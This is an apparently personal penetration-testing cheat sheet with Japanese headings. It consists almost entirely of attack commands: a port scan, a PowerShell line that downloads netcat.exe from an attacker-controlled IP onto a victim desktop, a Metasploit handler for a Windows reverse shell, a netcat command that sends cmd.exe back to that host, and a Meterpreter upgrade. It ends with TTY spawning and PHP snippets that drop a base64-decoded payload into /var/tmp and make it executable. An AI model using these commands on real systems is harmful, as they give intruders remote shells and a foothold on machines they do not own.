# nmap
```
nmap -Pn -sT -sV -p 1-10000 <ip address>
```

# powershell
## ファイル・ダウンロード（wget風）  
```
powershell -Command "(new-object System.Net.WebClient).Downloadfile('http://<ip address>/netcat.exe', 'c:\users\aaa\desktop\t.exe')"
```

# metasploit

## ターゲットにnetcatをおいてからのmetasploitでの接続方法  
```
use exploit/multi/handler
set payload windows/shell_reverse_tcp
set LHOST <ip address>
set LPORT 4444
run
```
- ここでターゲットPCから`nc.exe <ip address> 4444 -e c:\windows\system32\cmd.exe`とやってmetasploitに接続してから下記実施
```
use post/multi/manage/shell_to_meterpreter
set session 1
run
```
- meterpreterに接続する  
```
sessions -i 2
```

# TTY設定

```
python -c 'import pty; pty.spawn("/bin/bash")'
/bin/sh -i
```

# php  
- OSコマンド実行
```
<?php 
var_dump( system('chmod +x /var/tmp/bbb',$ret));
var_dump( $ret );
?>
```

- base64デコード
```
$str = "`base64 payload`";
$fileData = base64_decode($str);
$fileName = '/var/tmp/bbb';
file_put_contents($fileName, $fileData);

```
